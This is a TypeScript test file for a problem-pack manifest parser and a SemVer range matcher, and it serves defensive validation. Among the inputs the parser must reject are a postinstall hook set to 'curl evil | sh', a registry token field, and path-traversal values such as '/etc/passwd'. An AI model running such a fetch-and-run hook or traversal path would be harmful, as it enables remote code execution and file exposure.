/**
 * [Problem Packs / Issue #2087] Tests for the `tenkacloud-pack.json` manifest
 * schema + pure parser. Parser is I/O-free; these tests are deterministic.
 */

import { describe, expect, it } from "vitest";
import {
  type PackManifest,
  parsePackManifest,
  satisfiesCoreRange,
} from "../../lib/problem-pack/manifest";

/** A minimal, fully-valid manifest. Tests clone + mutate this. */
function validManifest(): Record<string, unknown> {
  return {
    schemaVersion: 1,
    id: "com.example.cloud-pack",
    version: "1.2.3",
    core: "^1.0.0",
    title: "Example Cloud Pack",
    description: "A sample pack of cloud problems.",
    license: "Apache-2.0",
    problemsRoot: "problems",
    requiredRuntimes: [
      { provider: "aws", engine: "cloudformation" },
      { provider: "gcp", engine: "infra-manager" },
    ],
    dependencies: [{ id: "com.example.base", range: ">=1.0.0 <2.0.0" }],
  };
}

function expectIssueAt(input: unknown, path: string): void {
  const result = parsePackManifest(input);
  expect(result.ok).toBe(false);
  if (result.ok) return;
  expect(result.issues.map((issue) => issue.path)).toContain(path);
}

describe("parsePackManifest (#2087)", () => {
  it("accepts a valid manifest and returns a typed result", () => {
    const result = parsePackManifest(validManifest());
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    const manifest: PackManifest = result.manifest;
    expect(manifest.id).toBe("com.example.cloud-pack");
    expect(manifest.requiredRuntimes).toHaveLength(2);
    expect(manifest.dependencies?.[0]?.id).toBe("com.example.base");
  });

  it("accepts a manifest without optional dependencies", () => {
    const manifest = validManifest();
    delete manifest.dependencies;
    expect(parsePackManifest(manifest).ok).toBe(true);
  });

  it("rejects an invalid id with a path-specific error", () => {
    expectIssueAt({ ...validManifest(), id: "NotReverseDNS" }, "id");
    expectIssueAt({ ...validManifest(), id: "single" }, "id");
  });

  it("rejects an invalid version", () => {
    expectIssueAt({ ...validManifest(), version: "1.2" }, "version");
    expectIssueAt({ ...validManifest(), version: "v1.2.3" }, "version");
  });

  it("rejects an invalid core range", () => {
    expectIssueAt({ ...validManifest(), core: "not-a-range" }, "core");
    expectIssueAt({ ...validManifest(), core: "" }, "core");
  });

  it("accepts common core range syntaxes", () => {
    for (const core of [
      "^1.0.0",
      "~1.2.0",
      ">=1.0.0 <2.0.0",
      "1.x",
      "*",
      "1.0.0 - 2.0.0",
      "1 || 2",
    ]) {
      const result = parsePackManifest({ ...validManifest(), core });
      expect(result.ok, `core ${core} should be valid`).toBe(true);
    }
  });

  it("rejects an absolute or traversal problemsRoot", () => {
    expectIssueAt({ ...validManifest(), problemsRoot: "/etc/passwd" }, "problemsRoot");
    expectIssueAt({ ...validManifest(), problemsRoot: "../escape" }, "problemsRoot");
    expectIssueAt({ ...validManifest(), problemsRoot: "a/../../b" }, "problemsRoot");
    expectIssueAt({ ...validManifest(), problemsRoot: "C:\\packs" }, "problemsRoot");
  });

  it("accepts a nested relative problemsRoot", () => {
    expect(parsePackManifest({ ...validManifest(), problemsRoot: "src/problems" }).ok).toBe(true);
  });

  it("rejects an unknown top-level field (no scripts / hooks / credentials in v1)", () => {
    expectIssueAt({ ...validManifest(), postinstall: "curl evil | sh" }, "postinstall");
    expectIssueAt({ ...validManifest(), registryToken: "secret" }, "registryToken");
  });

  it("rejects a wrong schemaVersion", () => {
    expectIssueAt({ ...validManifest(), schemaVersion: 2 }, "schemaVersion");
  });

  it("rejects an unknown runtime provider", () => {
    const manifest = validManifest();
    manifest.requiredRuntimes = [{ provider: "oracle", engine: "tf" }];
    expectIssueAt(manifest, "requiredRuntimes[0].provider");
  });

  it("rejects duplicate dependency ids", () => {
    const manifest = validManifest();
    manifest.dependencies = [
      { id: "com.example.base", range: "^1.0.0" },
      { id: "com.example.base", range: "^2.0.0" },
    ];
    expectIssueAt(manifest, "dependencies[1].id");
  });

  it("rejects a missing required field with a path-specific error", () => {
    const manifest = validManifest();
    delete manifest.core;
    expectIssueAt(manifest, "core");
  });

  it("rejects a non-object input", () => {
    expect(parsePackManifest(null).ok).toBe(false);
    expect(parsePackManifest("string").ok).toBe(false);
    expect(parsePackManifest(42).ok).toBe(false);
  });

  it("produces a deterministic parse result (stable, sorted issues)", () => {
    const broken = { ...validManifest(), id: "BAD", version: "x", core: "nope" };
    const a = parsePackManifest(broken);
    const b = parsePackManifest(broken);
    expect(a).toEqual(b);
    if (a.ok || b.ok) throw new Error("expected both to fail");
    const paths = a.issues.map((issue) => issue.path);
    expect([...paths].sort((x, y) => x.localeCompare(y))).toEqual(paths);
  });
});

// satisfiesCoreRange: the dependency-free SemVer-range matcher the #2091
// effective-catalog composer uses to gate a pack's manifest `core` range.
describe("satisfiesCoreRange", () => {
  it("should accept a caret range only within its locked-leftmost-component window", () => {
    expect(satisfiesCoreRange("1.4.0", "^1.0.0")).toBe(true);
    expect(satisfiesCoreRange("1.0.0", "^1.0.0")).toBe(true);
    expect(satisfiesCoreRange("2.0.0", "^1.0.0")).toBe(false);
    expect(satisfiesCoreRange("0.9.0", "^1.0.0")).toBe(false);
  });

  it("should treat caret on a 0.x version as locking the minor", () => {
    expect(satisfiesCoreRange("0.2.5", "^0.2.0")).toBe(true);
    expect(satisfiesCoreRange("0.3.0", "^0.2.0")).toBe(false);
  });

  it("should accept a tilde range up to the next minor", () => {
    expect(satisfiesCoreRange("1.2.9", "~1.2.0")).toBe(true);
    expect(satisfiesCoreRange("1.3.0", "~1.2.0")).toBe(false);
    expect(satisfiesCoreRange("1.9.0", "~1")).toBe(true);
    expect(satisfiesCoreRange("2.0.0", "~1")).toBe(false);
  });

  it("should evaluate comparator operators against a concrete version", () => {
    expect(satisfiesCoreRange("1.5.0", ">=1.0.0")).toBe(true);
    expect(satisfiesCoreRange("0.9.0", ">=1.0.0")).toBe(false);
    expect(satisfiesCoreRange("1.0.0", "<2.0.0")).toBe(true);
    expect(satisfiesCoreRange("2.0.0", "<2.0.0")).toBe(false);
    expect(satisfiesCoreRange("1.4.0", ">=1.0.0 <2.0.0")).toBe(true);
    expect(satisfiesCoreRange("2.1.0", ">=1.0.0 <2.0.0")).toBe(false);
  });

  it("should evaluate hyphen ranges inclusively on the lower bound", () => {
    expect(satisfiesCoreRange("1.5.0", "1.0.0 - 2.0.0")).toBe(true);
    expect(satisfiesCoreRange("1.0.0", "1.0.0 - 2.0.0")).toBe(true);
    expect(satisfiesCoreRange("2.5.0", "1.0.0 - 2.0.0")).toBe(false);
  });

  it("should accept any clause of an OR-alternation and wildcard tokens", () => {
    expect(satisfiesCoreRange("3.1.0", "^1.0.0 || ^3.0.0")).toBe(true);
    expect(satisfiesCoreRange("2.0.0", "^1.0.0 || ^3.0.0")).toBe(false);
    expect(satisfiesCoreRange("9.9.9", "*")).toBe(true);
    expect(satisfiesCoreRange("1.7.3", "1.x")).toBe(true);
    expect(satisfiesCoreRange("2.0.0", "1.x")).toBe(false);
  });

  it("should return false for an invalid version or range instead of throwing", () => {
    expect(satisfiesCoreRange("not-a-version", "^1.0.0")).toBe(false);
    expect(satisfiesCoreRange("1.0.0", "nope")).toBe(false);
    expect(satisfiesCoreRange("1", "^1.0.0")).toBe(false);
  });
});
